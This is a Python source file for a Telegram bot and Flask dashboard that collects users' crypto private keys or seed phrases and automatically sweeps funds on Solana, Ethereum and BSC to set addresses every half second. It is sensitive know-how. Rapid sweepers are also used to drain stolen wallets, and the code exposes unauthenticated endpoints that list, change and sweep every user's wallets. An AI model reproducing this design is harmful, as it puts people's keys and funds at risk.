from flask import Flask, render_template, request, jsonify
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder, CommandHandler, ContextTypes,
    ConversationHandler, CallbackQueryHandler, MessageHandler, filters
)
import asyncio
import logging
import json
import os
import warnings
from cryptography.fernet import Fernet
import threading
from threading import Lock
from datetime import datetime
from collections import deque

warnings.filterwarnings("ignore", category=UserWarning, module="telegram")

from chains import solana, ethereum, bsc
from config import TELEGRAM_BOT_TOKEN

# ─────────────────────────────────────────────
# CONFIG
# ─────────────────────────────────────────────
app = Flask(__name__)
logging.basicConfig(format="%(asctime)s [%(levelname)s] %(message)s", level=logging.INFO)
logger = logging.getLogger(__name__)

DATA_FILE = "wallets.json"
HISTORY_FILE = "history.json"
SECRET_KEY = os.getenv("SECRET_KEY")
PORT = int(os.getenv("PORT", 5000))

cipher = Fernet(SECRET_KEY.encode())
data_lock = Lock()
data_store = {}        # {user_id: [wallet, ...]}
sweep_history = deque(maxlen=200)
sweeper_running = True
stats = {"sweeps_today": 0, "total_sweeps": 0, "errors_today": 0}

CHAIN_MODULES = {"solana": solana, "ethereum": ethereum, "bsc": bsc}
CHAIN_SYMBOLS = {"solana": "SOL", "ethereum": "ETH", "bsc": "BNB"}
CHAIN_COLORS  = {"solana": "#9945FF", "ethereum": "#627EEA", "bsc": "#F0B90B"}

# ─────────────────────────────────────────────
# ENCRYPTION
# ─────────────────────────────────────────────
def encrypt(data: str) -> str:
    return cipher.encrypt(data.encode()).decode()

def decrypt(data: str) -> str:
    return cipher.decrypt(data.encode()).decode()

# ─────────────────────────────────────────────
# PERSISTENCE
# ─────────────────────────────────────────────
def load_data():
    global data_store, sweep_history
    if os.path.exists(DATA_FILE):
        try:
            with open(DATA_FILE) as f:
                data_store = {int(k): v for k, v in json.load(f).items()}
            logger.info(f"Loaded {sum(len(v) for v in data_store.values())} wallets")
        except Exception as e:
            logger.error(f"Load wallets error: {e}")
    if os.path.exists(HISTORY_FILE):
        try:
            with open(HISTORY_FILE) as f:
                sweep_history = deque(json.load(f), maxlen=200)
        except Exception:
            pass

def save_data():
    try:
        with data_lock:
            with open(DATA_FILE, "w") as f:
                json.dump(data_store, f, indent=2)
    except Exception as e:
        logger.error(f"Save error: {e}")

def save_history():
    try:
        with open(HISTORY_FILE, "w") as f:
            json.dump(list(sweep_history), f, indent=2)
    except Exception:
        pass

def add_history(entry: dict):
    entry["timestamp"] = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")
    sweep_history.appendleft(entry)
    save_history()
    if entry.get("status") == "success":
        stats["sweeps_today"] += 1
        stats["total_sweeps"] += 1
    elif entry.get("status") == "error":
        stats["errors_today"] += 1

# ─────────────────────────────────────────────
# FLASK ROUTES
# ─────────────────────────────────────────────
@app.route("/")
def dashboard():
    return render_template("index.html")

@app.route("/api/stats")
def api_stats():
    with data_lock:
        total_wallets = sum(len(v) for v in data_store.values())
        active_chains = len({w["chain"] for wallets in data_store.values() for w in wallets})
    return jsonify({
        "total_wallets": total_wallets,
        "active_chains": active_chains,
        "sweeps_today": stats["sweeps_today"],
        "total_sweeps": stats["total_sweeps"],
        "errors_today": stats["errors_today"],
        "sweeper_running": sweeper_running,
    })

@app.route("/api/wallets")
def api_wallets():
    rows = []
    with data_lock:
        for uid, wallets in data_store.items():
            for i, w in enumerate(wallets):
                rows.append({
                    "user_id": uid,
                    "index": i,
                    "chain": w["chain"],
                    "symbol": CHAIN_SYMBOLS.get(w["chain"], w["chain"].upper()),
                    "type": w.get("type", "private_key"),
                    "label": w.get("label", f"Wallet {i+1}"),
                    "destination": w["destination"],
                    "enabled": w.get("enabled", True),
                    "last_sweep": w.get("last_sweep"),
                    "last_amount": w.get("last_amount"),
                })
    return jsonify(rows)

@app.route("/api/wallets", methods=["POST"])
def api_add_wallet():
    body = request.json or {}
    uid = int(body.get("user_id", 0))
    if not uid:
        return jsonify({"error": "user_id required"}), 400
    required = ["chain", "secret", "destination"]
    for f_ in required:
        if not body.get(f_):
            return jsonify({"error": f"{f_} required"}), 400

    chain = body["chain"].lower()
    if chain not in CHAIN_MODULES:
        return jsonify({"error": "Unsupported chain"}), 400

    wallet = {
        "chain": chain,
        "type": body.get("type", "private_key"),
        "secret": encrypt(body["secret"]),
        "destination": body["destination"],
        "label": body.get("label", f"{CHAIN_SYMBOLS[chain]} Wallet"),
        "enabled": True,
        "last_sweep": None,
        "last_amount": None,
    }
    with data_lock:
        data_store.setdefault(uid, []).append(wallet)
        save_data()
    return jsonify({"ok": True, "label": wallet["label"]})

@app.route("/api/wallets/<int:uid>/<int:idx>", methods=["DELETE"])
def api_remove_wallet(uid, idx):
    with data_lock:
        wallets = data_store.get(uid, [])
        if idx >= len(wallets):
            return jsonify({"error": "Not found"}), 404
        wallets.pop(idx)
        if not wallets:
            data_store.pop(uid, None)
        save_data()
    return jsonify({"ok": True})

@app.route("/api/wallets/<int:uid>/<int:idx>/toggle", methods=["POST"])
def api_toggle_wallet(uid, idx):
    with data_lock:
        wallets = data_store.get(uid, [])
        if idx >= len(wallets):
            return jsonify({"error": "Not found"}), 404
        wallets[idx]["enabled"] = not wallets[idx].get("enabled", True)
        save_data()
        return jsonify({"enabled": wallets[idx]["enabled"]})

@app.route("/api/toggle", methods=["POST"])
def api_toggle_sweeper():
    global sweeper_running
    sweeper_running = not sweeper_running
    logger.info(f"Sweeper {'started' if sweeper_running else 'stopped'}")
    return jsonify({"sweeper_running": sweeper_running})

@app.route("/api/sweep", methods=["POST"])
def api_manual_sweep():
    body = request.json or {}
    uid_filter = body.get("user_id")
    results = []
    with data_lock:
        snapshot = list(data_store.items())
    for uid, wallets in snapshot:
        if uid_filter and int(uid_filter) != uid:
            continue
        for w in wallets:
            if not w.get("enabled", True):
                continue
            try:
                secret = decrypt(w["secret"])
                mod = CHAIN_MODULES[w["chain"]]
                res = mod.forward(secret, w["destination"], uid)
                if res.get("status") == "success":
                    w["last_sweep"] = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")
                    w["last_amount"] = res["amount"]
                add_history({**res, "user_id": uid, "destination": w["destination"]})
                results.append(res)
            except Exception as e:
                results.append({"chain": w["chain"], "status": "error", "error": str(e)})
    save_data()
    return jsonify({"results": results, "count": len(results)})

@app.route("/api/history")
def api_history():
    limit = int(request.args.get("limit", 50))
    return jsonify(list(sweep_history)[:limit])

@app.route("/api/balance", methods=["POST"])
def api_balance():
    body = request.json or {}
    chain = body.get("chain", "").lower()
    address = body.get("address", "")
    if chain not in CHAIN_MODULES:
        return jsonify({"error": "Unsupported chain"}), 400
    try:
        bal = CHAIN_MODULES[chain].get_balance(address)
        return jsonify({"balance": bal, "symbol": CHAIN_SYMBOLS[chain]})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/chains")
def api_chains():
    chain_stats = {}
    for chain in ["solana", "ethereum", "bsc"]:
        count = sum(1 for wallets in data_store.values() for w in wallets if w["chain"] == chain)
        chain_stats[chain] = {
            "symbol": CHAIN_SYMBOLS[chain],
            "color": CHAIN_COLORS[chain],
            "wallet_count": count,
        }
    return jsonify(chain_stats)

# ─────────────────────────────────────────────
# SWEEPER LOOP
# ─────────────────────────────────────────────
async def sweeper_loop():
    logger.info("Sweeper started (0.5s interval)")
    while True:
        if sweeper_running:
            with data_lock:
                snapshot = list(data_store.items())
            tasks = []
            for uid, wallets in snapshot:
                for w in wallets:
                    if w.get("enabled", True):
                        tasks.append(process_wallet(uid, w))
            if tasks:
                await asyncio.gather(*tasks, return_exceptions=True)
        await asyncio.sleep(0.5)

async def process_wallet(uid, wallet):
    try:
        secret = decrypt(wallet["secret"])
        mod = CHAIN_MODULES[wallet["chain"]]
        res = await asyncio.to_thread(mod.forward, secret, wallet["destination"], uid)
        if res.get("status") == "success":
            wallet["last_sweep"] = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")
            wallet["last_amount"] = res["amount"]
            add_history({**res, "user_id": uid, "destination": wallet["destination"]})
            save_data()
    except Exception as e:
        logger.error(f"Sweep error uid={uid}: {e}")

# ─────────────────────────────────────────────
# TELEGRAM BOT
# ─────────────────────────────────────────────
CHAIN, TYPE_CHOICE, SECRET_INPUT, DESTINATION_INPUT, LABEL_INPUT = range(5)

def main_menu_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("➕ Add Wallet", callback_data="add_wallet"),
         InlineKeyboardButton("📋 My Wallets", callback_data="my_wallets")],
        [InlineKeyboardButton("💰 Check Balances", callback_data="check_balances"),
         InlineKeyboardButton("⚡ Manual Sweep", callback_data="manual_sweep")],
        [InlineKeyboardButton("📊 Statistics", callback_data="stats"),
         InlineKeyboardButton("📜 History", callback_data="history")],
        [InlineKeyboardButton("🗑 Remove Last Wallet", callback_data="remove_last"),
         InlineKeyboardButton("⏯ Toggle Sweeper", callback_data="toggle")],
        [InlineKeyboardButton("❓ Help", callback_data="help")],
    ])

def sweeper_status_text():
    return "🟢 Running" if sweeper_running else "🔴 Stopped"

async def start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    with data_lock:
        wcount = sum(len(v) for v in data_store.values())
    text = (
        f"⚡ *Multi-Chain Wallet Sweeper*\n\n"
        f"Sweeper: {sweeper_status_text()}\n"
        f"Wallets monitored: *{wcount}*\n"
        f"Chains: SOL · ETH · BNB\n\n"
        f"Use the buttons below to manage your wallets."
    )
    await update.message.reply_text(text, parse_mode="Markdown", reply_markup=main_menu_kb())

async def main_button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data

    if data == "add_wallet":
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("◎ Solana", callback_data="solana"),
             InlineKeyboardButton("Ξ Ethereum", callback_data="ethereum"),
             InlineKeyboardButton("⬡ BSC", callback_data="bsc")],
            [InlineKeyboardButton("« Back", callback_data="back_main")],
        ])
        await query.edit_message_text("*Select a chain to add a wallet:*", parse_mode="Markdown", reply_markup=kb)
        return CHAIN

    elif data == "my_wallets":
        await show_wallets(query)

    elif data == "check_balances":
        await show_balances(query)

    elif data == "manual_sweep":
        await query.edit_message_text("⏳ Running manual sweep on all wallets...")
        uid = query.from_user.id
        count, swept = 0, 0.0
        with data_lock:
            wallets = list(data_store.get(uid, []))
        for w in wallets:
            if not w.get("enabled", True):
                continue
            try:
                secret = decrypt(w["secret"])
                mod = CHAIN_MODULES[w["chain"]]
                res = await asyncio.to_thread(mod.forward, secret, w["destination"], uid)
                count += 1
                if res.get("status") == "success":
                    swept += res.get("amount", 0)
                    w["last_sweep"] = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")
                    w["last_amount"] = res["amount"]
                    add_history({**res, "user_id": uid, "destination": w["destination"]})
            except Exception:
                pass
        save_data()
        text = f"✅ *Manual Sweep Complete*\nWallets checked: {count}\nFunds moved: {swept:.6f} (combined)"
        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=main_menu_kb())

    elif data == "stats":
        with data_lock:
            total_wallets = sum(len(v) for v in data_store.values())
            user_wallets = len(data_store.get(query.from_user.id, []))
        text = (
            f"📊 *Statistics*\n\n"
            f"Your wallets: *{user_wallets}*\n"
            f"Total wallets: *{total_wallets}*\n"
            f"Sweeps today: *{stats['sweeps_today']}*\n"
            f"Total sweeps: *{stats['total_sweeps']}*\n"
            f"Errors today: *{stats['errors_today']}*\n"
            f"Sweeper: {sweeper_status_text()}"
        )
        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=main_menu_kb())

    elif data == "history":
        uid = query.from_user.id
        user_hist = [h for h in sweep_history if h.get("user_id") == uid][:10]
        if not user_hist:
            text = "📜 *No sweep history yet.*"
        else:
            lines = ["📜 *Recent Sweeps*\n"]
            for h in user_hist:
                sym = CHAIN_SYMBOLS.get(h.get("chain", ""), "?")
                amt = f"{h.get('amount', 0):.6f}" if h.get("amount") else "—"
                lines.append(f"• {sym} {amt} | {h.get('status','?')} | {h.get('timestamp','')[:16]}")
            text = "\n".join(lines)
        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=main_menu_kb())

    elif data == "remove_last":
        uid = query.from_user.id
        with data_lock:
            if uid in data_store and data_store[uid]:
                removed = data_store[uid].pop()
                if not data_store[uid]:
                    del data_store[uid]
                save_data()
                await query.edit_message_text(
                    f"🗑 Removed: *{removed.get('label','wallet')}* ({removed['chain'].upper()})",
                    parse_mode="Markdown", reply_markup=main_menu_kb()
                )
            else:
                await query.edit_message_text("Nothing to remove.", reply_markup=main_menu_kb())

    elif data == "toggle":
        global sweeper_running
        sweeper_running = not sweeper_running
        await query.edit_message_text(
            f"Sweeper is now: {sweeper_status_text()}",
            reply_markup=main_menu_kb()
        )

    elif data == "help":
        text = (
            "❓ *Help & Commands*\n\n"
            "/start — Open main menu\n"
            "/wallets — List your wallets\n"
            "/sweep — Manually sweep all wallets\n"
            "/balances — Check all wallet balances\n"
            "/history — Recent sweep history\n"
            "/stats — View statistics\n"
            "/toggle — Start or stop auto-sweeper\n"
            "/remove — Remove last wallet\n\n"
            "*Supported Chains:*\n"
            "• Solana (SOL) — private key or seed phrase\n"
            "• Ethereum (ETH) — private key or mnemonic\n"
            "• BSC / BNB — private key or mnemonic\n\n"
            "*Private Key Formats:*\n"
            "• Solana: comma-separated bytes or base58\n"
            "• ETH/BSC: hex (with or without 0x)\n"
            "• All chains: 12/24-word seed phrase"
        )
        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=main_menu_kb())

    elif data == "back_main":
        with data_lock:
            wcount = sum(len(v) for v in data_store.values())
        text = (
            f"⚡ *Multi-Chain Wallet Sweeper*\n\n"
            f"Sweeper: {sweeper_status_text()}\n"
            f"Wallets monitored: *{wcount}*"
        )
        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=main_menu_kb())

async def show_wallets(query):
    uid = query.from_user.id
    with data_lock:
        wallets = list(data_store.get(uid, []))
    if not wallets:
        await query.edit_message_text("📋 You have no wallets yet. Use ➕ Add Wallet.", reply_markup=main_menu_kb())
        return
    lines = ["📋 *Your Wallets*\n"]
    for i, w in enumerate(wallets):
        status_icon = "✅" if w.get("enabled", True) else "⏸"
        last = w.get("last_sweep", "Never")[:16] if w.get("last_sweep") else "Never"
        lines.append(
            f"{status_icon} *{i+1}. {w.get('label','Wallet')}*\n"
            f"   Chain: {w['chain'].upper()} | Dest: `{w['destination'][:12]}...`\n"
            f"   Last sweep: {last}"
        )
    await query.edit_message_text("\n".join(lines), parse_mode="Markdown", reply_markup=main_menu_kb())

async def show_balances(query):
    uid = query.from_user.id
    with data_lock:
        wallets = list(data_store.get(uid, []))
    if not wallets:
        await query.edit_message_text("No wallets to check.", reply_markup=main_menu_kb())
        return
    await query.edit_message_text("⏳ Fetching balances...")
    lines = ["💰 *Wallet Balances*\n"]
    for i, w in enumerate(wallets):
        try:
            secret = decrypt(w["secret"])
            mod = CHAIN_MODULES[w["chain"]]
            from eth_account import Account
            Account.enable_unaudited_hdwallet_features()
            if w["chain"] in ("ethereum", "bsc"):
                from web3 import Web3
                acct = Account.from_mnemonic(secret) if " " in secret else Account.from_key(secret if secret.startswith("0x") else "0x" + secret)
                address = acct.address
            else:
                from chains.solana import keypair_from_secret
                kp = keypair_from_secret(secret)
                address = str(kp.pubkey())
            bal = await asyncio.to_thread(mod.get_balance, address)
            sym = CHAIN_SYMBOLS[w["chain"]]
            lines.append(f"*{w.get('label','Wallet')}*: {bal:.6f} {sym}")
        except Exception as e:
            lines.append(f"*{w.get('label','Wallet')}*: Error — {str(e)[:40]}")
    await query.edit_message_text("\n".join(lines), parse_mode="Markdown", reply_markup=main_menu_kb())

# ── Conversation: Add Wallet ──
async def chain_selected(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    ctx.user_data["chain"] = query.data
    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("🔑 Private Key", callback_data="private_key"),
         InlineKeyboardButton("📜 Seed Phrase", callback_data="seed_phrase")],
        [InlineKeyboardButton("« Back", callback_data="add_wallet")],
    ])
    await query.edit_message_text(
        f"Chain: *{query.data.upper()}*\nChoose key type:",
        parse_mode="Markdown", reply_markup=kb
    )
    return TYPE_CHOICE

async def type_selected(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    ctx.user_data["type"] = query.data
    hint = "12 or 24-word seed phrase" if query.data == "seed_phrase" else "hex private key (or comma-separated bytes for Solana)"
    await query.edit_message_text(
        f"✏️ Paste your *{'Seed Phrase' if query.data == 'seed_phrase' else 'Private Key'}*:\n\n_({hint})_",
        parse_mode="Markdown"
    )
    return SECRET_INPUT

async def receive_secret(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    ctx.user_data["secret"] = update.message.text.strip()
    await update.message.delete()
    await update.message.reply_text("📍 Now paste the *destination wallet address* (funds will be swept here):", parse_mode="Markdown")
    return DESTINATION_INPUT

async def receive_destination(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    ctx.user_data["destination"] = update.message.text.strip()
    chain = ctx.user_data.get("chain", "")
    sym = CHAIN_SYMBOLS.get(chain, chain.upper())
    await update.message.reply_text(
        f"🏷 Enter a *label* for this wallet (e.g. 'My {sym} wallet'), or type `skip`:",
        parse_mode="Markdown"
    )
    return LABEL_INPUT

async def receive_label(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    label_input = update.message.text.strip()
    chain = ctx.user_data.get("chain")
    sym = CHAIN_SYMBOLS.get(chain, chain.upper())
    label = label_input if label_input.lower() != "skip" else f"{sym} Wallet"

    wallet = {
        "chain": chain,
        "type": ctx.user_data.get("type"),
        "secret": encrypt(ctx.user_data.get("secret")),
        "destination": ctx.user_data.get("destination"),
        "label": label,
        "enabled": True,
        "last_sweep": None,
        "last_amount": None,
    }

    with data_lock:
        data_store.setdefault(uid, []).append(wallet)
        save_data()

    dest = wallet["destination"]
    await update.message.reply_text(
        f"✅ *Wallet Added!*\n\n"
        f"Label: {label}\n"
        f"Chain: *{chain.upper()}*\n"
        f"Destination: `{dest[:20]}...`\n\n"
        f"The sweeper will now monitor this wallet every 0.5 seconds.",
        parse_mode="Markdown",
        reply_markup=main_menu_kb()
    )
    ctx.user_data.clear()
    return ConversationHandler.END

async def cancel(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    ctx.user_data.clear()
    await update.message.reply_text("❌ Cancelled.", reply_markup=main_menu_kb())
    return ConversationHandler.END

# ── Direct Commands ──
async def cmd_wallets(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    with data_lock:
        wallets = list(data_store.get(uid, []))
    if not wallets:
        await update.message.reply_text("You have no wallets yet.", reply_markup=main_menu_kb())
        return
    lines = ["📋 *Your Wallets*\n"]
    for i, w in enumerate(wallets):
        lines.append(f"{i+1}. *{w.get('label','Wallet')}* [{w['chain'].upper()}] → `{w['destination'][:12]}...`")
    await update.message.reply_text("\n".join(lines), parse_mode="Markdown", reply_markup=main_menu_kb())

async def cmd_sweep(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    msg = await update.message.reply_text("⏳ Sweeping all your wallets...")
    with data_lock:
        wallets = list(data_store.get(uid, []))
    if not wallets:
        await msg.edit_text("No wallets to sweep.")
        return
    count, swept = 0, []
    for w in wallets:
        if not w.get("enabled", True):
            continue
        try:
            secret = decrypt(w["secret"])
            mod = CHAIN_MODULES[w["chain"]]
            res = await asyncio.to_thread(mod.forward, secret, w["destination"], uid)
            count += 1
            if res.get("status") == "success":
                swept.append(f"{res['amount']:.6f} {CHAIN_SYMBOLS[w['chain']]}")
                add_history({**res, "user_id": uid, "destination": w["destination"]})
        except Exception:
            pass
    save_data()
    if swept:
        await msg.edit_text(f"✅ Swept: {', '.join(swept)}", reply_markup=main_menu_kb())
    else:
        await msg.edit_text(f"✅ Checked {count} wallet(s) — no funds to sweep.", reply_markup=main_menu_kb())

async def cmd_toggle(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    global sweeper_running
    sweeper_running = not sweeper_running
    await update.message.reply_text(f"Sweeper is now: {sweeper_status_text()}", reply_markup=main_menu_kb())

async def cmd_stats(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    with data_lock:
        total_wallets = sum(len(v) for v in data_store.values())
    text = (
        f"📊 *Statistics*\n\n"
        f"Total wallets: *{total_wallets}*\n"
        f"Sweeps today: *{stats['sweeps_today']}*\n"
        f"Total sweeps: *{stats['total_sweeps']}*\n"
        f"Errors today: *{stats['errors_today']}*\n"
        f"Sweeper: {sweeper_status_text()}"
    )
    await update.message.reply_text(text, parse_mode="Markdown", reply_markup=main_menu_kb())

async def cmd_history(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    user_hist = [h for h in sweep_history if h.get("user_id") == uid][:10]
    if not user_hist:
        await update.message.reply_text("No history yet.", reply_markup=main_menu_kb())
        return
    lines = ["📜 *Recent Sweeps*\n"]
    for h in user_hist:
        sym = CHAIN_SYMBOLS.get(h.get("chain", ""), "?")
        amt = f"{h.get('amount',0):.6f}" if h.get("amount") else "—"
        lines.append(f"• {sym} {amt} | {h.get('status','?')} | {h.get('timestamp','')[:16]}")
    await update.message.reply_text("\n".join(lines), parse_mode="Markdown", reply_markup=main_menu_kb())

async def cmd_remove(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    with data_lock:
        if uid in data_store and data_store[uid]:
            removed = data_store[uid].pop()
            if not data_store[uid]:
                del data_store[uid]
            save_data()
            await update.message.reply_text(
                f"🗑 Removed: *{removed.get('label','wallet')}*",
                parse_mode="Markdown", reply_markup=main_menu_kb()
            )
        else:
            await update.message.reply_text("Nothing to remove.", reply_markup=main_menu_kb())

async def cmd_help(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    text = (
        "❓ *Commands*\n\n"
        "/start — Main menu\n"
        "/wallets — List wallets\n"
        "/sweep — Manual sweep now\n"
        "/balances — Check balances\n"
        "/history — Sweep history\n"
        "/stats — Statistics\n"
        "/toggle — Start/stop sweeper\n"
        "/remove — Remove last wallet\n"
        "/help — This message"
    )
    await update.message.reply_text(text, parse_mode="Markdown", reply_markup=main_menu_kb())

async def cmd_balances(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    with data_lock:
        wallets = list(data_store.get(uid, []))
    if not wallets:
        await update.message.reply_text("No wallets added yet.")
        return
    msg = await update.message.reply_text("⏳ Fetching balances...")
    lines = ["💰 *Wallet Balances*\n"]
    for w in wallets:
        try:
            secret = decrypt(w["secret"])
            mod = CHAIN_MODULES[w["chain"]]
            if w["chain"] in ("ethereum", "bsc"):
                from web3 import Web3
                from eth_account import Account
                Account.enable_unaudited_hdwallet_features()
                acct = Account.from_mnemonic(secret) if " " in secret else Account.from_key(secret if secret.startswith("0x") else "0x" + secret)
                address = acct.address
            else:
                from chains.solana import keypair_from_secret
                kp = keypair_from_secret(secret)
                address = str(kp.pubkey())
            bal = await asyncio.to_thread(mod.get_balance, address)
            sym = CHAIN_SYMBOLS[w["chain"]]
            lines.append(f"*{w.get('label','?')}*: `{bal:.6f}` {sym}")
        except Exception as e:
            lines.append(f"*{w.get('label','?')}*: Error")
    await msg.edit_text("\n".join(lines), parse_mode="Markdown")

# ─────────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────────
async def main():
    load_data()
    application = ApplicationBuilder().token(TELEGRAM_BOT_TOKEN).build()

    conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(main_button, pattern="^add_wallet$")],
        states={
            CHAIN: [CallbackQueryHandler(chain_selected, pattern="^(solana|ethereum|bsc)$")],
            TYPE_CHOICE: [CallbackQueryHandler(type_selected, pattern="^(private_key|seed_phrase)$")],
            SECRET_INPUT: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_secret)],
            DESTINATION_INPUT: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_destination)],
            LABEL_INPUT: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_label)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
        per_message=False,
        allow_reentry=True,
    )

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("wallets", cmd_wallets))
    application.add_handler(CommandHandler("sweep", cmd_sweep))
    application.add_handler(CommandHandler("toggle", cmd_toggle))
    application.add_handler(CommandHandler("stats", cmd_stats))
    application.add_handler(CommandHandler("history", cmd_history))
    application.add_handler(CommandHandler("remove", cmd_remove))
    application.add_handler(CommandHandler("help", cmd_help))
    application.add_handler(CommandHandler("balances", cmd_balances))
    application.add_handler(conv)
    application.add_handler(CallbackQueryHandler(main_button))

    asyncio.create_task(sweeper_loop())

    await application.initialize()
    await application.start()
    await application.updater.start_polling(drop_pending_updates=True)
    logger.info("Telegram bot polling started")
    await asyncio.Event().wait()

if __name__ == "__main__":
    logger.info(f"Starting on port {PORT}")
    threading.Thread(
        target=lambda: app.run(host="0.0.0.0", port=PORT, debug=False, use_reloader=False),
        daemon=True,
    ).start()
    asyncio.run(main())
